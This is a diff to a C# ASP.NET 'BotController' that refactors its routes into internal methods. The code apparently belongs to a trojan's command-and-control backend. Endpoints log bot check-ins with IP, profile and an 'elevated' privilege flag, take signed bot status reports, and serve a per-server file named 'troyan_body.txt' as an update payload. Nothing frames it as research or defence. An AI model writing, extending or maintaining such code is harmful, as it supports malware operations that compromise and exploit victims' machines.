@@ -16,10 +16,14 @@ public class BotController: BaseController
     {
     }
     
-    [HttpGet("/{profile}/{random}/{target}/DnLog")]
+    [HttpGet("{profile}/{random}/{target}/DnLog")]
     public async Task<IActionResult> DnLog(string profile, string random, string target)
     {
-        var ipAddress = IpAddress;
+        return await DnLog(Server, IpAddress, profile, random, target);
+    }
+    
+    internal async Task<IActionResult> DnLog(string server, string ipAddress, string profile, string random, string target)
+    {
         await using (var connection = new SqlConnection(_connectionString))
         {
             await connection.OpenAsync();
@@ -28,7 +32,7 @@ public class BotController: BaseController
             {
                 command.CommandType = CommandType.StoredProcedure;
 
-                command.Parameters.AddWithValue("@server", Server ?? (object)DBNull.Value);
+                command.Parameters.AddWithValue("@server", server ?? (object)DBNull.Value);
                 command.Parameters.AddWithValue("@profile", profile ?? (object)DBNull.Value);
                 command.Parameters.AddWithValue("@ip", ipAddress);
 
@@ -38,21 +42,27 @@ public class BotController: BaseController
 
         return Ok();
     }
-    
-    [HttpPost("/upsert")]
+
+    [HttpPost("upsert")]
     [Consumes("application/json")]
     [Produces("application/json")]
-    public async Task<IActionResult> UpsertBotLog([FromHeader(Name = "X-Signature")] string xSignature, [FromBody] BotLogRequest request)
+    public async Task<IActionResult> UpsertBotLog([FromHeader(Name = "X-Signature")] string xSignature,
+        [FromBody] BotLogRequest request)
     {
         var ipAddress = IpAddress;
         if (string.IsNullOrWhiteSpace(ipAddress))
             return BadRequest("IP address not found.");
         if (string.IsNullOrWhiteSpace(Server))
             return BadRequest("Server address not found.");
+        return await UpsertBotLog(Server, IpAddress, xSignature, request);
+    }
 
+    internal async Task<IActionResult> UpsertBotLog(string server, string ipAddress,
+        [FromHeader(Name = "X-Signature")] string xSignature, [FromBody] BotLogRequest request)
+    {
         string jsonBody = JsonSerializer.Serialize(request, JsonOptions);
 
-       if (!ValidateHash(jsonBody, xSignature, SecretKey))
+        if (!ValidateHash(jsonBody, xSignature, SecretKey))
         {
             return Unauthorized("Invalid signature.");
         }
@@ -67,7 +77,7 @@ public class BotController: BaseController
                 {
                     command.CommandType = CommandType.StoredProcedure;
 
-                    command.Parameters.AddWithValue("@server", Server ?? (object)DBNull.Value);
+                    command.Parameters.AddWithValue("@server", server ?? (object)DBNull.Value);
                     command.Parameters.AddWithValue("@ip", ipAddress);
                     command.Parameters.AddWithValue("@id", request.Id);
                     command.Parameters.AddWithValue("@elevated", request.ElevatedNumber);
@@ -98,10 +108,14 @@ public class BotController: BaseController
         }
     }
     
-    [HttpGet("/update")]
+    [HttpGet("update")]
     public IActionResult Update()
     {
-        var server = Server;
+        return Update(Server);
+    }
+    
+    internal IActionResult Update(string server)
+    {
         var fileBytes = System.IO.File.ReadAllBytes($@"C:\data\{server}\troyan_body.txt");
         return File(fileBytes, "text/plain");
     }
